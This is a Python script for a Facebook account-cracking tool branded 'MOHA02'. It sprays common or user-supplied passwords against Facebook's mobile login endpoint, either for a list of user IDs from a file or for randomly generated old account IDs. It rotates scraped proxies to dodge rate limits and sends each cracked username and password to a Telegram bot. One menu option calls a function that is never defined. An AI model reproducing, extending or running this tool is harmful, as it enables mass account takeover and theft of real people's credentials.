# -*- coding: utf-8 -*-
import os, sys, time, requests, random, threading
from concurrent.futures import ThreadPoolExecutor

G = '\033[1;32m' 
R = '\033[1;31m' 
Y = '\033[1;33m' 
B = '\033[1;34m' 
P = '\033[1;35m' 
C = '\033[1;36m' 
W = '\033[1;37m' 

hits, cp, bad, loop = 0, 0, 0, 0
stop_check = False
proxy_list = []

def logo():
    os.system('clear')
    print(f"""
{B}   __  __  ____  _   _    _      ___ ____  
{B}  |  \/  |/ __ \| | | |  / \    / _ \___ \ 
{P}  | |\/| | |  | | |_| | / _ \  | | | |__) |
{P}  | |  | | |__| |  _  |/ ___ \ | |_| / __/ 
{G}  |_|  |_|\____/|_| |_/_/   \_\ \___/_____|
{G}       SYSTEM V4.5 [ULTIMATE] - BY MOHA02
{Y}--------------------------------------------------""")

def get_proxies():
    global proxy_list
    try:
        res = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all").text
        proxy_list = res.splitlines()
    except:
        proxy_list = []

def login_fb(user, pw, chat_id, bot_token):
    global hits, cp, bad, stop_check, loop
    if stop_check: return
    
    prox = {'http': 'http://' + random.choice(proxy_list)} if proxy_list else None
    ua = "Dalvik/2.1.0 (Linux; U; Android 11; RMX3263) [FBAN/FB4A;FBAV/450.0.0.45.109;]"
    url = "https://b-graph.facebook.com/auth/login"
    data = {
        "email": user, "password": pw,
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "method": "auth.login", "format": "json"
    }
    
    try:
        res = requests.post(url, data=data, headers={"User-Agent": ua}, proxies=prox, timeout=10).json()
        
        if "session_key" in res:
            hits += 1
            print(f"\r{G}[MOHA-HIT] {user} | {pw}                     ")
            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=✅ MOHA HIT!\nUser: {user}\nPass: {pw}")
        
        elif "www.facebook.com" in str(res): # حساب سيكور
            cp += 1
            print(f"\r{Y}[MOHA-CP] {user} | {pw}                      ")
            # إرسال السيكور أيضاً للتلجرام
            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=⚠️ MOHA CHECKPOINT!\nUser: {user}\nPass: {pw}")
            
        elif "Calls to this api have exceeded" in str(res):
            stop_check = True
            print(f"\n{R}[!] API BANNED! ON/OFF Airplane Mode.")
        else:
            bad += 1
            sys.stdout.write(f"\r{W}[MOHA02 🖤] {loop}/{hits}/{cp} | {user} "); sys.stdout.flush()
    except:
        pass

def tool_check_file():
    global stop_check, loop, hits, cp, bad
    stop_check, loop, hits, cp, bad = False, 0, 0, 0, 0
    logo()
    path = input(f"{G}[+] File Path: {B}")
    tok = input(f"{G}[+] Bot Token: {B}")
    idx = input(f"{G}[+] Chat ID: {B}")
    num = int(input(f"{G}[+] Pass Limit: {P}"))
    pws = [input(f"{C}  └─ Pw {i+1}: {B}") for i in range(num)]
    
    get_proxies() # تحديث البروكسي قبل فحص الملف
    
    try:
        users = open(path, "r").read().splitlines()
        print(f"{Y}[*] Checking File with Proxies...")
        with ThreadPoolExecutor(max_workers=35) as pool:
            for u in users:
                if stop_check: break
                uid = u.split('|')[0] if '|' in u else u
                for p in pws: 
                    pool.submit(login_fb, uid, p, idx, tok)
                loop += 1
    except: print(f"{R}[!] File Not Found!")

def tool_old_hunting():
    global stop_check, loop, hits, cp, bad
    stop_check, loop, hits, cp, bad = False, 0, 0, 0, 0
    logo()
    get_proxies()
    print(f"{C}[1] 2004 {C}[2] 2009 {C}[3] 2011 {C}[4] 2014")
    yr = input(f"\n{G}[+] Year: {P}")
    lim = int(input(f"{G}[+] Limit: {P}"))
    tok = input(f"{G}[+] Token: {B}")
    idx = input(f"{G}[+] ID: {B}")
    pws = ['123456', '1234567', '12345678', '123123', '321321']
    
    with ThreadPoolExecutor(max_workers=35) as pool:
        while loop < lim:
            if stop_check: break
            if yr == '1': uid = str(random.randint(100000, 99000000))
            elif yr == '2': uid = "100000" + str(random.randint(400000000, 999999999))
            elif yr == '3': uid = "100001" + str(random.randint(100000000, 999999999))
            else: uid = "100005" + str(random.randint(100000000, 999999999))
            pool.submit(login_fb, uid, random.choice(pws), idx, tok)
            loop += 1

def main():
    while True:
        logo()
        print(f"{C}[1] Extract IDs\n{C}[2] File Check (Show HIT & CP)\n{C}[3] Old Hunting\n{R}[0] Exit")
        c = input(f"\n{G}MOHA-02 > {P}")
        if c == '1': tool_extract() 
        elif c == '2': tool_check_file()
        elif c == '3': tool_old_hunting()
        elif c == '0': sys.exit()

if __name__ == "__main__":
    main()
